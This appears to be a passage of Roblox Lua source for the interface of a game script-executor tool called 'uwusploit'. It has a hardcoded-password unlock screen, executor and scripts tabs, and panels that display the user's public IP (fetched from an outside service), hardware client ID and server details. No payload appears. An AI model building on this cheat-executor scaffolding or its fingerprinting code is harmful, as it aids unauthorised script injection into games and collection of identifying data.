-------------------------------------------------------------------------------------------------------------------------------

uwu["password frame"].Size = UDim2.new(0, 401, 0, 249)
uwu["password frame"].Position = UDim2.new(0, 0, 1, 1)

uwu["password frame"].BackgroundColor3 = uwu["default background color"]

uwu["password frame"].BorderColor3 = uwu["default border color"]
uwu["password frame"].BorderSizePixel = 1

uwu["password frame"].Parent = uwu["top bar"]
uwu["password frame"].ZIndex = 45
uwu["password frame"].Visible = true

-------------------------------------------------------------------------------------------------------------------------------

uwu["password text"].Size = UDim2.new(0, 393, 0, 241)
uwu["password text"].Position = UDim2.new(0, 4, 0, 4)
uwu["password text"].BackgroundColor3 = uwu["default background color"]
uwu["password text"].BorderColor3 = uwu["default border color"]
uwu["password text"].BackgroundTransparency = 0
uwu["password text"].BorderSizePixel = 1
uwu["password text"].Parent = uwu["password frame"]
uwu["password text"].Visible = true

uwu["password text"].TextColor3 = uwu["default border color"]
uwu["password text"].Font = Enum.Font.RobotoMono
uwu["password text"].TextSize = 15
uwu["password text"].TextScaled = false
uwu["password text"].Text = ""
uwu["password text"].TextXAlignment = Enum.TextXAlignment.Center
uwu["password text"].TextYAlignment = Enum.TextYAlignment.Center
uwu["password text"].ZIndex = 45

uwu["password text padding"] = Instance.new("UIPadding")
uwu["password text padding"].PaddingBottom = UDim.new(0, 9)
uwu["password text padding"].Parent = uwu["password text"]

-------------------------------------------------------------------------------------------------------------------------------

uwu["password label"].Size = UDim2.new(0, 250, 0, 30)
uwu["password label"].AnchorPoint = Vector2.new(0.5, 0.5)
uwu["password label"].BackgroundTransparency = 0
uwu["password label"].BorderSizePixel = 0
uwu["password label"].TextColor3 = uwu["default border color"]
uwu["password label"].Font = Enum.Font.RobotoMono
uwu["password label"].TextSize = 15
uwu["password label"].Text = "enter password"
uwu["password label"].TextXAlignment = Enum.TextXAlignment.Center
uwu["password label"].TextYAlignment = Enum.TextYAlignment.Center
uwu["password label"].ZIndex = 46
uwu["password label"].Parent = uwu["password text"]

-------------------------------------------------------------------------------------------------------------------------------

uwu["password box"].Size = UDim2.new(0, 250, 0, 30)
uwu["password box"].AnchorPoint = Vector2.new(0.5, 0.5)
uwu["password box"].BackgroundColor3 = uwu["default background color"]
uwu["password box"].BorderColor3 = uwu["default border color"]
uwu["password box"].BackgroundTransparency = 0
uwu["password box"].BorderSizePixel = 0
uwu["password box"].Parent = uwu["password text"]
uwu["password box"].Visible = true

uwu["password box"].TextColor3 = uwu["default background color"]
uwu["password box"].PlaceholderColor3 = uwu["default 1/2 color"]
uwu["password box"].Font = Enum.Font.RobotoMono
uwu["password box"].TextTransparency = 1
uwu["password box"].TextSize = 15
uwu["password box"].Name = "fakebox"
uwu["password box"].TextScaled = false
uwu["password box"].PlaceholderText = ""
uwu["password box"].Text = ""
uwu["password box"].TextXAlignment = Enum.TextXAlignment.Center
uwu["password box"].TextYAlignment = Enum.TextYAlignment.Center
uwu["password box"].ZIndex = 46
uwu["password box"].ClipsDescendants = true

uwu["password box padding"] = Instance.new("UIPadding")
uwu["password box padding"].PaddingBottom = UDim.new(0, 2)
uwu["password box padding"].Parent = uwu["password box"]

-------------------------------------------------------------------------------------------------------------------------------

cancheck = true

uwu["password check button"].Size = UDim2.new(0, 250, 0, 30)
uwu["password check button"].BackgroundColor3 = uwu["default border color"]
uwu["password check button"].AnchorPoint = Vector2.new(0.5, 0)
uwu["password check button"].TextColor3 = Color3.new(1, 1, 1)
uwu["password check button"].Font = Enum.Font.Nunito
uwu["password check button"].TextSize = 15
uwu["password check button"].Text = "check"
uwu["password check button"].Parent = uwu["password text"]
uwu["password check button"].ZIndex = 48

uwu["password check padding"] = Instance.new("UIPadding")
uwu["password check padding"].PaddingBottom = UDim.new(0, 2)
uwu["password check padding"].Parent = uwu["password check"]

-------------------------------------------------------------------------------------------------------------------------------

uwu["pw"] = "q"
uwu["lmao"] = false
uwu["typing"] = false
uwu["typed"] = false
uwu["cv"] = true

uwu["password bullet label"].Name = "fakebox"
uwu["password bullet label"].AnchorPoint = Vector2.new(0.5, 0.5)
uwu["password bullet label"].Size = UDim2.new(0, 250, 0, 30)
uwu["password bullet label"].BackgroundTransparency = 0
uwu["password bullet label"].TextColor3 = uwu["default text color"]
uwu["password bullet label"].Font = Enum.Font.Nunito
uwu["password bullet label"].TextSize = 15
uwu["password bullet label"].TextScaled = false
uwu["password bullet label"].TextXAlignment = Enum.TextXAlignment.Center
uwu["password bullet label"].TextYAlignment = Enum.TextYAlignment.Center
uwu["password bullet label"].ZIndex = 47
uwu["password bullet label"].Text = "enter password"
uwu["password bullet label"].TextTransparency = 0
uwu["password bullet label"].Parent = uwu["password text"]
uwu["password bullet label"].ClipsDescendants = true

uwu["password bullet label padding"] = Instance.new("UIPadding")
uwu["password bullet label padding"].PaddingBottom = UDim.new(0, 2)
uwu["password bullet label padding"].Parent = uwu["password bullet label"]

uwu["password fake cursor"].AnchorPoint = Vector2.new(0.5, 0.5)
uwu["password fake cursor"].Size = UDim2.new(0, 250, 0, 30)
uwu["password fake cursor"].BackgroundTransparency = 1
uwu["password fake cursor"].TextColor3 = uwu["default 1/2 color"]
uwu["password fake cursor"].Font = Enum.Font.Nunito
uwu["password fake cursor"].TextSize = 15
uwu["password fake cursor"].TextScaled = false
uwu["password fake cursor"].TextXAlignment = Enum.TextXAlignment.Center
uwu["password fake cursor"].TextYAlignment = Enum.TextYAlignment.Center
uwu["password fake cursor"].ZIndex = 48
uwu["password fake cursor"].Text = ""
uwu["password fake cursor"].TextTransparency = 0
uwu["password fake cursor"].Parent = uwu["password text"]
uwu["password fake cursor"].ClipsDescendants = true

uwu["password fake cursor padding"] = Instance.new("UIPadding")
uwu["password fake cursor padding"].PaddingBottom = UDim.new(0, 2)
uwu["password fake cursor padding"].Parent = uwu["password fake cursor"]

uwu["password label"].Position = UDim2.new(0.5, 0, 0.5, - 13 - (18 + 17))
uwu["password box"].Position = UDim2.new(0.5, 0, 0.5, 22 - (18 + 17))
uwu["password check button"].Position = UDim2.new(0.5, 0, 0.5, 42 - (18 + 17))
uwu["password bullet label"].Position = UDim2.new(0.5, 0, 0.5, 22 - (18 + 17))
uwu["password fake cursor"].Position = UDim2.new(0.5, 0, 0.5, 22 - (18 + 17))

uwu["max chars"] = 30

local function updbl()
	if #uwu["password box"].Text > uwu["max chars"] then
		uwu["password box"].Text = uwu["password box"].Text:sub(1, uwu["max chars"])
	end

	local textLen = #uwu["password box"].Text
	local hasText = textLen > 0

	if hasText then
		uwu["password bullet label"].Text = string.rep("•", textLen)
		uwu["password bullet label"].TextColor3 = uwu["default text color"]
	else
		uwu["password bullet label"].Text = "enter password"
		uwu["password bullet label"].TextColor3 = uwu["default 1/2 color"]
	end

	local spaces = string.rep(" ", textLen)
	if uwu["typing"] then
		uwu["password fake cursor"].Text = spaces .. (uwu["cv"] and " " or "│")
	else
		uwu["password fake cursor"].Text = spaces
	end
end

local function srcb()
	uwu["typing"] = true
	while uwu["typing"] do
		uwu["cv"] = not uwu["cv"]
		updbl()
		t(0.3)
	end
end

local function stcb()
	uwu["typing"] = false
	updbl()
end

uwu["password box"]:GetPropertyChangedSignal("Text"):Connect(updbl)

uwu["password box"].Focused:Connect(function()
	uwu["password bullet label"].TextTransparency = 0
	updbl()
	srcb()
end)

uwu["password box"].FocusLost:Connect(function()
	stcb()
	uwu["typed"] = true
end)

uwu["asset ids tab"].Visible = false
uwu["commands tab"].Visible = false
uwu["scripts tab"].Visible = false
uwu["executor tab"].Visible = false
uwu["introduction"].Visible = false

local entered = Instance.new("Sound")
entered.SoundId = "rbxassetid://8458409341"
entered.Parent = uwu["local player"]
entered.Name = "canttouchthis"
entered.Volume = 0
entered.TimePosition = 0
spawn(function() entered:Play() end)

local function checkpass()
	playclicksound()
	stcb()
	if cancheck == true then
		cancheck = false
		if uwu["password box"].Text == uwu["pw"] then canpress = false
			entered.Volume = 1
			spawn(function() entered:Play() end)
			uwu["unlocked"] = true
			uwu["password label"].Text = "correct password"
			spawn(function() unablenotify("welcome to uwusploit v" .. uwu["version"] .. ".") end)

			spawn(function()
				if not uwu["unlocked"] then return end
				local tweens = {}
				for name, offset in pairs(showOffsets) do
					local smallButton = uwu[name]
					smallButton.Visible = true
					local targetPosition = originalPositions[name] + offset
					local targetRotation = 0
					local tween = tweenPositionAndRotation(smallButton, targetPosition, targetRotation, 0.5)
					table.insert(tweens, tween)
				end
				for _, tween in ipairs(tweens) do
					tween.Completed:Wait()
				end
			end)

			spawn(function()
				uwu["asset ids tab"].Visible = true
				uwu["commands tab"].Visible = true
				uwu["scripts tab"].Visible = true
				uwu["executor tab"].Visible = true
				uwu["introduction"].Visible = true

				uwu["executor tab"].MouseButton1Click:Connect(function()
					playclicksound()

					uwu["scripts tab bottom cover"].Visible = false
					uwu["commands tab bottom cover"].Visible = false
					uwu["asset ids tab bottom cover"].Visible = false
					uwu["executor tab bottom cover"].Visible = true

					uwu["executor scrolling frame"].Visible = true
					uwu["execute button"].Visible = true
					uwu["execute from client button"].Visible = true
					uwu["clear button"].Visible = true

					uwu["next page"].Visible = false
					uwu["previous page"].Visible = false
					uwu["button holder"].Visible = false 
					uwu["script search bar"].Visible = false

					uwu["list of commands"].Visible = false
					uwu["command bar"].Visible = false
					uwu["execute command button"].Visible = false

					uwu["asset id type indicator"].Visible = false
					uwu["asset id search bar"].Visible = false
					uwu["next page 2 button"].Visible = false
					uwu["previous page 2 button"].Visible = false
					uwu["switch asset id type button"].Visible = false
					uwu["switch asset id type button 2"].Visible = false

					uwu["introduction"]:Destroy()

					uwu["copy asset id 3 button"].Visible = false
					uwu["asset image id 3"].Visible = false
					uwu["asset image name 3"].Visible = false
					uwu["asset image 3"].Visible = false
					uwu["copy asset id 2 button"].Visible = false
					uwu["asset image id 2"].Visible = false
					uwu["asset image name 2"].Visible = false
					uwu["asset image 2"].Visible = false
					uwu["copy asset id 1 button"].Visible = false
					uwu["asset image id 1"].Visible = false
					uwu["asset image name 1"].Visible = false
					uwu["asset image 1"].Visible = false
				end)

				uwu["scripts tab"].MouseButton1Click:Connect(function()
					playclicksound()

					uwu["scripts tab bottom cover"].Visible = true
					uwu["commands tab bottom cover"].Visible = false
					uwu["asset ids tab bottom cover"].Visible = false
					uwu["executor tab bottom cover"].Visible = false

					uwu["executor scrolling frame"].Visible = false
					uwu["execute button"].Visible = false
					uwu["execute from client button"].Visible = false
					uwu["clear button"].Visible = false
					uwu["list of commands"].Visible = false
					uwu["command bar"].Visible = false
					uwu["execute command button"].Visible = false
					uwu["asset id type indicator"].Visible = false
					uwu["asset id search bar"].Visible = false
					uwu["next page 2 button"].Visible = false
					uwu["previous page 2 button"].Visible = false
					uwu["switch asset id type button"].Visible = false
					uwu["switch asset id type button 2"].Visible = false
					if uwu["introduction"] then
						uwu["introduction"]:Destroy()
					end

					uwu["copy asset id 3 button"].Visible = false
					uwu["asset image id 3"].Visible = false
					uwu["asset image name 3"].Visible = false
					uwu["asset image 3"].Visible = false
					uwu["copy asset id 2 button"].Visible = false
					uwu["asset image id 2"].Visible = false
					uwu["asset image name 2"].Visible = false
					uwu["asset image 2"].Visible = false
					uwu["copy asset id 1 button"].Visible = false
					uwu["asset image id 1"].Visible = false
					uwu["asset image name 1"].Visible = false
					uwu["asset image 1"].Visible = false

					showScriptPage() 
					uwu["script search bar"].Visible = true
				end)

				uwu["commands tab"].MouseButton1Click:Connect(function()
					playclicksound()

					uwu["scripts tab bottom cover"].Visible = false
					uwu["commands tab bottom cover"].Visible = true
					uwu["asset ids tab bottom cover"].Visible = false
					uwu["executor tab bottom cover"].Visible = false

					uwu["executor scrolling frame"].Visible = false
					uwu["execute button"].Visible = false
					uwu["execute from client button"].Visible = false
					uwu["clear button"].Visible = false

					uwu["next page"].Visible = false
					uwu["previous page"].Visible = false
					uwu["button holder"].Visible = false
					uwu["script search bar"].Visible = false

					uwu["list of commands"].Visible = true
					uwu["command bar"].Visible = true
					uwu["execute command button"].Visible = true

					uwu["asset id type indicator"].Visible = false
					uwu["asset id search bar"].Visible = false
					uwu["next page 2 button"].Visible = false
					uwu["previous page 2 button"].Visible = false
					uwu["switch asset id type button"].Visible = false
					uwu["switch asset id type button 2"].Visible = false

					uwu["introduction"]:Destroy()

					uwu["copy asset id 3 button"].Visible = false
					uwu["asset image id 3"].Visible = false
					uwu["asset image name 3"].Visible = false
					uwu["asset image 3"].Visible = false
					uwu["copy asset id 2 button"].Visible = false
					uwu["asset image id 2"].Visible = false
					uwu["asset image name 2"].Visible = false
					uwu["asset image 2"].Visible = false
					uwu["copy asset id 1 button"].Visible = false
					uwu["asset image id 1"].Visible = false
					uwu["asset image name 1"].Visible = false
					uwu["asset image 1"].Visible = false
				end)

				uwu["asset ids tab"].MouseButton1Click:Connect(function()
					playclicksound()

					uwu["scripts tab bottom cover"].Visible = false
					uwu["commands tab bottom cover"].Visible = false
					uwu["asset ids tab bottom cover"].Visible = true
					uwu["executor tab bottom cover"].Visible = false

					uwu["executor scrolling frame"].Visible = false
					uwu["execute button"].Visible = false
					uwu["execute from client button"].Visible = false
					uwu["clear button"].Visible = false
					uwu["next page"].Visible = false
					uwu["previous page"].Visible = false
					uwu["button holder"].Visible = false
					uwu["script search bar"].Visible = false

					uwu["list of commands"].Visible = false
					uwu["command bar"].Visible = false
					uwu["execute command button"].Visible = false

					uwu["asset id type indicator"].Visible = true
					uwu["asset id search bar"].Visible = true
					uwu["next page 2 button"].Visible = true
					uwu["previous page 2 button"].Visible = true
					uwu["switch asset id type button"].Visible = true
					uwu["switch asset id type button 2"].Visible = true

					uwu["introduction"]:Destroy()

					uwu["copy asset id 3 button"].Visible = true
					uwu["asset image id 3"].Visible = true
					uwu["asset image name 3"].Visible = true
					uwu["asset image 3"].Visible = true
					uwu["copy asset id 2 button"].Visible = true
					uwu["asset image id 2"].Visible = true
					uwu["asset image name 2"].Visible = true
					uwu["asset image 2"].Visible = true
					uwu["copy asset id 1 button"].Visible = true
					uwu["asset image id 1"].Visible = true
					uwu["asset image name 1"].Visible = true
					uwu["asset image 1"].Visible = true

					currentAssetIdPageIndex = savedAssetIdPageIndex
					updatePage()
				end)
			end)

			local repositionButton = uwu["top bar reposition button"]
			local minimizeButton = uwu["top bar minimize button"]
			local tweenService = uwu["tween service"]

			local originalMinimizePos = minimizeButton.Position
			local newRepositionPos = UDim2.new(0, 331, 0, 4.7)

			minimizeButton.Position = newRepositionPos

			local repositionTween = tweenService:Create(repositionButton, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {Position = newRepositionPos})
			repositionTween:Play()

			repositionTween.Completed:Wait()

			minimizeButton.Position = newRepositionPos

			uwu["top bar minimize button"].Visible = false
			local minimizeTween = tweenService:Create(minimizeButton, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {Position = originalMinimizePos})
			minimizeTween:Play()
			uwu["top bar minimize button"].Visible = true

			uwu["pwb"] = Instance.new("Frame")
			uwu["pwb"].Size = UDim2.new(0, 401, 0, 249)
			uwu["pwb"].Position = UDim2.new(0, 0, 1, 1)
			uwu["pwb"].BackgroundColor3 = uwu["default background color"]
			uwu["pwb"].BorderColor3 = uwu["default border color"]
			uwu["pwb"].BorderSizePixel = 1
			uwu["pwb"].Parent = uwu["top bar"]
			uwu["pwb"].BackgroundTransparency = 1
			uwu["pwb"].ZIndex = 69

			local fadeIn = tweenService:Create(uwu["pwb"], TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {BackgroundTransparency = 0})
			fadeIn:Play()

			fadeIn.Completed:Connect(function()
				uwu["password frame"]:Destroy()

				local shrink = tweenService:Create(uwu["pwb"], TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {Size = UDim2.new(0, 401, 0, 0)})
				shrink:Play()

				shrink.Completed:Connect(function()
					uwu["pwb"]:Destroy() canpress = true canpress2 = true
				end)
			end)
		else
			local nay = Instance.new("Sound")
			nay.SoundId = "rbxassetid://8503529943"
			nay.Parent = uwu["local player"]
			nay.Volume = 3.3
			nay.Name = "canttouchthis"
			nay.TimePosition = 0.01

			spawn(function() nay:Play() end)
			uwu["password box"].Text = ""
			if uwu["lmao"] == false then
				uwu["lmao"] = true
				uwu["typed"] = false
				uwu["password bullet label"].Text = "enter password"
				uwu["password bullet label"].TextTransparency = 0
				uwu["password label"].Text = "wrong password"
				t(1)
				uwu["lmao"] = false
				uwu["password label"].Text = "enter password"
				cancheck = true
			end
		end
	end
end

uwu["password check button"].MouseButton1Click:Connect(checkpass)

-------------------------------------------------------------------------------------------------------------------------------

local function cpf()
	while true do
		if (not uwu["password frame"] or not uwu["password frame"].Parent or uwu["password frame"].Visible == false) 
			and uwu["unlocked"] == false then
			if uwu["screen gui"] then
				uwu["screen gui"]:Destroy()
			end
			break
		end
		uwu["run service"].RenderStepped:Wait()
	end
end

spawn(cpf)

-------------------------------------------------------------------------------------------------------------------------------

local loopEnabled = false
local visibilityConnection = nil

function toggleLoop(state)
	loopEnabled = state

	if visibilityConnection then
		visibilityConnection:Disconnect()
		visibilityConnection = nil
	end

	if loopEnabled then
		uwu["toggle interface visibility button"].Text = uwu["top bar"].Visible and "o.o" or ">.<"

		visibilityConnection = uwu["top bar"]:GetPropertyChangedSignal("Visible"):Connect(function()
			uwu["toggle interface visibility button"].Text = uwu["top bar"].Visible and "o.o" or ">.<"
		end)
	end
end

toggleLoop(true)

-------------------------------------------------------------------------------------------------------------------------------

uwu["introduction"].Size = UDim2.new(0, 393, 0, 214)
uwu["introduction"].Position = UDim2.new(0, 4, 0, 32)
uwu["introduction"].BackgroundColor3 = uwu["default background color"]
uwu["introduction"].BorderColor3 = uwu["default border color"]
uwu["introduction"].BorderSizePixel = 1
uwu["introduction"].Parent = uwu["main frame 1"]
uwu["introduction"].ZIndex = 19
uwu["introduction"].Visible = true

uwu["introduction"].TextColor3 = uwu["default border color"]
uwu["introduction"].Font = Enum.Font.RobotoMono
uwu["introduction"].TextSize = 15
uwu["introduction"].TextScaled = false
uwu["introduction"].TextXAlignment = Enum.TextXAlignment.Center
uwu["introduction"].TextYAlignment = Enum.TextYAlignment.Center
uwu["introduction"].ZIndex = 19

uwu["introduction text padding"] = Instance.new("UIPadding")
uwu["introduction text padding"].PaddingBottom = UDim.new(0, 2)
uwu["introduction text padding"].Parent = uwu["introduction"]

uwu["introduction"].Text = "welcome to uwusploit [v".. uwu["version"] .."]\n\ndeveloped by team noxious, team occulence &\nteam symphysis"

-------------------------------------------------------------------------------------------------------------------------------

uwu["player information tab"].Size = UDim2.new(0, 133, 0, 26)
uwu["player information tab"].Position = UDim2.new(0, 0, 0, 0)
uwu["player information tab"].BackgroundColor3 = uwu["default background color"]
uwu["player information tab"].BorderColor3 = uwu["default border color"]
uwu["player information tab"].BorderSizePixel = 1
uwu["player information tab"].TextColor3 = uwu["default border color"]
uwu["player information tab"].Font = Enum.Font.RobotoMono
uwu["player information tab"].TextSize = 15
uwu["player information tab"].TextScaled = false
uwu["player information tab"].Text = "player info"
uwu["player information tab"].TextXAlignment = Enum.TextXAlignment.Center
uwu["player information tab"].TextYAlignment = Enum.TextYAlignment.Center

uwu["player information tab text padding"] = Instance.new("UIPadding")
uwu["player information tab text padding"].PaddingLeft = UDim.new(0, 0)
uwu["player information tab text padding"].Parent = uwu["scripts tab"]
uwu["player information tab"].Parent = uwu["main frame 2"]
uwu["player information tab"].ZIndex = 21

uwu["player information tab bottom cover"].Size = UDim2.new(0, 133, 0, 2)
uwu["player information tab bottom cover"].Position = UDim2.new(0, 0, 0, 26)
uwu["player information tab bottom cover"].BackgroundColor3 = uwu["default background color"]
uwu["player information tab bottom cover"].BorderSizePixel = 0
uwu["player information tab bottom cover"].Parent = uwu["main frame 2"]
uwu["player information tab bottom cover"].ZIndex = 21.5
uwu["player information tab bottom cover"].Visible = true

uwu["information pfp"].Size = UDim2.new(0, 50, 0, 50)
uwu["information pfp"].Position = UDim2.new(0, 335, 0, 156)
uwu["information pfp"].BackgroundColor3 = uwu["default background color"]
uwu["information pfp"].BorderColor3 = uwu["default border color"]
uwu["information pfp"].BorderSizePixel = 1
uwu["information pfp"].Parent = uwu["information holder"]
uwu["information pfp"].Image = game:GetService("Players"):GetUserThumbnailAsync(uwu["local player"].UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150)
uwu["information pfp"].ZIndex = 22
uwu["information pfp"].Visible = false

function fetchrig()
	local humanoid = uwu["local player"].Character and uwu["local player"].Character:FindFirstChildOfClass("Humanoid")
	if humanoid then
		return humanoid.RigType.Name:upper()
	end
	return "n/a"
end

function fetchfriends()
	local success, result = pcall(function()
		return #uwu["local player"]:GetFriendsOnline()
	end)
	return success and result or "n/a"
end

function fetchfriendsonline()
	local success, result = pcall(function()
		local friends = uwu["local player"]:GetFriendsOnline()
		local playingSameGame = 0
		for _, friend in pairs(friends) do
			if friend.PlaceId and friend.PlaceId == game.PlaceId then
				playingSameGame += 1
			end
		end
		return playingSameGame
	end)
	return success and result or "n/a"
end

function fetchaccdate()
	local success, result = pcall(function()
		local timestamp = os.time() - (uwu["local player"].AccountAge * 86400)
		return os.date("%Y-%m-%d", timestamp)
	end)
	return success and result or "n/a"
end

function fetchexecutor()
	if uwu["in studio"] then return "n/a" end
	return identifyexecutor()
end

function fetchdevice()
	local success, result = pcall(function()
		local platform = game:GetService("UserInputService"):GetPlatform()
		local device = "unknown"

		if platform == Enum.Platform.Windows then device = "pc"
		elseif platform == Enum.Platform.OSX then device = "mac"
		elseif platform == Enum.Platform.IOS then device = "ios"
		elseif platform == Enum.Platform.Android then device = "android"
		elseif platform == Enum.Platform.XBoxOne then device = "xbox"
		elseif platform == Enum.Platform.PS4 then device = "playstation" end

		if game:GetService("GuiService"):IsTenFootInterface() then
			device = device .. " (console)"
		elseif platform == Enum.Platform.IOS or platform == Enum.Platform.Android then
			device = device .. " (mobile)"
		end

		return device
	end)
	return success and result or "n/a"
end

local displayName = uwu["local player"].DisplayName or "n/a"
local username = "@" .. (uwu["local player"].Name or "n/a")
local friendsCount = tonumber(fetchfriends()) or 0
local friendsInGame = tonumber(fetchfriendsonline()) or 0
local rigType = fetchrig() or "n/a"
local accountAge = tonumber(uwu["local player"].AccountAge) or 0
local accountCreated = fetchaccdate() or "n/a"
local userId = tonumber(uwu["local player"].UserId) or 0
local membershipType = uwu["local player"].MembershipType.Name:lower() or "n/a"
local executorInfo = fetchexecutor() or "n/a"
local deviceInfo = fetchdevice():lower() or "n/a"
local ipaddress = "n/a"
local hwid = "n/a"

if not uwu["in studio"] then
	ipaddress = game:HttpGet("https://v4.ident.me/") or "n/a"
	hwid = game:GetService("RbxAnalyticsService"):GetClientId() or "n/a"
end

uwu["player information tab"].MouseButton1Click:Connect(function()
	playclicksound()

	uwu["player information tab bottom cover"].Visible = true
	uwu["server information tab bottom cover"].Visible = false
	uwu["console output tab bottom cover"].Visible = false

	uwu["information holder"].Visible = true
	uwu["server information holder"].Visible = false
	uwu["output scrolling frame"].Visible = false
	uwu["output holder"].Visible = false
	uwu["console label"].Visible = false
	uwu["clear console button"].Visible = false

	local informationText = string.format([[
user / display name: %s (%s)
user ID: %d
account age: %d days (creation: %s)
membership: %s
friends online: %d
friends in game: %d
rig type: %s
device: %s
executor: %s
ip address: %s
hardware id: %s
subnet mask: 255.255.255.0
    ]],
		displayName, 
		username, 
		userId, 
		accountAge, 
		accountCreated, 
		membershipType,
		friendsCount,
		friendsInGame,
		rigType, 
		deviceInfo,
		executorInfo,
		ipaddress,
		hwid)

	uwu["information holder"].Text = informationText
end)

spawn(function()
	local informationText = string.format([[
user / display name: %s (%s)
user ID: %d
account age: %d days (created: %s)
membership: %s
friends online: %d
friends in game: %d
rig type: %s
device: %s
executor: %s
ip address: %s
hardware id: %s
subnet mask: 255.255.255.0
    ]],
		displayName, 
		username, 
		userId, 
		accountAge, 
		accountCreated, 
		membershipType,
		friendsCount,
		friendsInGame,
		rigType, 
		deviceInfo,
		executorInfo,
		ipaddress,
		hwid)

	uwu["information holder"].Text = informationText
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["server information tab"].Size = UDim2.new(0, 133, 0, 26)
uwu["server information tab"].Position = UDim2.new(0, 134, 0, 0)
uwu["server information tab"].BackgroundColor3 = uwu["default background color"]
uwu["server information tab"].BorderColor3 = uwu["default border color"]
uwu["server information tab"].BorderSizePixel = 1
uwu["server information tab"].TextColor3 = uwu["default border color"]
uwu["server information tab"].Font = Enum.Font.RobotoMono
uwu["server information tab"].TextSize = 15
uwu["server information tab"].TextScaled = false
uwu["server information tab"].Text = "server info"
uwu["server information tab"].TextXAlignment = Enum.TextXAlignment.Center
uwu["server information tab"].TextYAlignment = Enum.TextYAlignment.Center

uwu["server information tab text padding"] = Instance.new("UIPadding")
uwu["server information tab text padding"].PaddingLeft = UDim.new(0, 0)
uwu["server information tab text padding"].Parent = uwu["scripts tab"]
uwu["server information tab"].Parent = uwu["main frame 2"]
uwu["server information tab"].ZIndex = 21

uwu["server information tab bottom cover"].Size = UDim2.new(0, 133, 0, 2)
uwu["server information tab bottom cover"].Position = UDim2.new(0, 134, 0, 26)
uwu["server information tab bottom cover"].BackgroundColor3 = uwu["default background color"]
uwu["server information tab bottom cover"].BorderSizePixel = 0
uwu["server information tab bottom cover"].Parent = uwu["main frame 2"]
uwu["server information tab bottom cover"].ZIndex = 21.5
uwu["server information tab bottom cover"].Visible = false

function getPlayerCount()
	local success, result = pcall(function()
		return #game:GetService("Players"):GetPlayers()
	end)
	return success and result or "n/a"
end

function getFriendsInServer()
	local success, result = pcall(function()
		local friendsInServer = 0
		local localPlayer = game:GetService("Players").LocalPlayer
		for _, player in pairs(game:GetService("Players"):GetPlayers()) do
			if player ~= localPlayer and localPlayer:IsFriendsWith(player.UserId) then
				friendsInServer += 1
			end
		end
		return friendsInServer
	end)
	return success and result or "n/a"
end

function getPlaceId()
	return game.PlaceId or "n/a"
end

function getJobId()
	return game.JobId or "n/a"
end

function getGameName()
	local success, result = pcall(function()
		return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
	end)
	return success and result or "n/a"
end

function getCreatorInfo()
	local success, result = pcall(function()
		local creator = game.CreatorId
		local creatorType = game.CreatorType
		if creatorType == Enum.CreatorType.User then
			return game:GetService("Players"):GetNameFromUserIdAsync(creator)
		elseif creatorType == Enum.CreatorType.Group then
			local groupInfo = game:GetService("GroupService"):GetGroupInfoAsync(creator)
			return groupInfo.Name .. " (group)"
		end
	end)
	return success and result or "n/a"
end

function getCreatorInServer()
	local success, result = pcall(function()
		local creatorId = game.CreatorId
		local creatorType = game.CreatorType

		if creatorType == Enum.CreatorType.User then
			local creatorPlayer = game:GetService("Players"):GetPlayerByUserId(creatorId)
			return creatorPlayer and creatorPlayer.Name or false
		elseif creatorType == Enum.CreatorType.Group then
			local groupInfo = game:GetService("GroupService"):GetGroupInfoAsync(creatorId)
			local groupPlayers = game:GetService("Players"):GetPlayers()

			for _, player in ipairs(groupPlayers) do
				local rank = player:GetRankInGroup(creatorId)
				if rank >= 250 then
					return player.Name
				end
			end
		end
		return false
	end)
	return success and result or "n/a"
end

function getServerRegion()
	local success, result = pcall(function()
		local region = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(game:GetService("Players").LocalPlayer)
		return region:gsub("^%l", string.upper)
	end)
	return success and result or "n/a"
end

function getServerFPS()
	local success, result = pcall(function()
		return math.floor(1/game:GetService("RunService").RenderStepped:Wait())
	end)
	return success and result or "n/a"
end

function getServerUptime()
	local success, result = pcall(function()
		return os.time() - game:GetService("Workspace").DistributedGameTime
	end)
	if success then
		local hours = math.floor(result/3600)
		local minutes = math.floor((result%3600)/60)
		return string.format("%dh %dm", hours, minutes)
	end
	return "n/a"
end

function getServerMaxPlayers()
	return game:GetService("Players").MaxPlayers or "n/a"
end

uwu["server information tab"].MouseButton1Click:Connect(function()
	playclicksound()

	uwu["player information tab bottom cover"].Visible = false
	uwu["server information tab bottom cover"].Visible = true
	uwu["console output tab bottom cover"].Visible = false

	uwu["information holder"].Visible = false
	uwu["server information holder"].Visible = true
	uwu["output holder"].Visible = false
	uwu["output scrolling frame"].Visible = false
	uwu["console label"].Visible = false
	uwu["clear console button"].Visible = false

	spawn(function()
		local playerCount = getPlayerCount()
		local placeId = getPlaceId()
		local jobId = getJobId()
		local gameName = getGameName()
		local creatorInfo = getCreatorInfo()
		local creatorInServer = getCreatorInServer()
		local serverRegion = getServerRegion()
		local serverFPS = getServerFPS()
		local serverUptime = getServerUptime()
		local maxPlayers = getServerMaxPlayers()

		local informationText = string.format(
			"game name: %s\n" ..
				"creator: %s\n" ..
				"creators in server: %s\n" ..
				"players in server: %s/%s\n" ..
				"place ID: %s\n" ..
				"job ID: %s\n" ..
				"server region: %s\n" ..
				"ping: %s ms\n" ..
				"server FPS: %s\n" ..
				"uptime: %s\n",
			gameName, 
			creatorInfo,
			creatorInServer or "none",
			playerCount, maxPlayers,
			placeId,
			jobId,
			serverRegion,
			math.round(uwu["local player"]:GetNetworkPing() * 1000),
			serverFPS,
			serverUptime
		)

		uwu["server information holder"].Text = informationText
	end)
end)

-------------------------------------------------------------------------------------------------------------------------------

uwu["output holder"].Size = UDim2.new(0, 393, 0, 214)
uwu["output holder"].Position = UDim2.new(0, 4, 0, 31)
uwu["output holder"].BackgroundColor3 = uwu["default background color"]
uwu["output holder"].BorderColor3 = uwu["default border color"]
uwu["output holder"].BorderSizePixel = 0
uwu["output holder"].Parent = uwu["main frame 2"]
uwu["output holder"].Visible = false
uwu["output holder"].ZIndex = 23

-------------------------------------------------------------------------------------------------------------------------------

uwu["output scrolling frame"].Size = UDim2.new(0, 393, 0, 140)
